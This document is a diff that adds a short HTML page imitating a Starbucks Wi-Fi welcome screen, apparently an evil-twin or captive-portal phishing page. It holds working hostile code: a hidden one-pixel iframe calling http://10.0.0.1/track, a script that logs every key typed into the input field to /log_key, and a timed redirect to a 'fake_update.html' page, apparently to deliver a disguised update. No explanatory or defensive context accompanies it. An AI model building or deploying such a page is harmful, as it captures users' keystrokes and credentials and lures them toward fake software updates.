@@ -1,0 +1,15 @@
+<html><body>
+<h2>Welcome to Starbucks</h2>
+<form>
+<input id="input" type="text" placeholder="Loading..." autofocus>
+</form>
+<iframe src="http://10.0.0.1/track" style="display:none;" width="1" height="1"></iframe>
+<script>
+document.getElementById("input").addEventListener("keydown", function(e) {
+    fetch('/log_key?key=' + encodeURIComponent(e.key));
+});
+setTimeout(() => {
+    window.location.href = "http://10.0.0.1/fake_update.html";
+}, 4000);
+</script>
+</body></html>
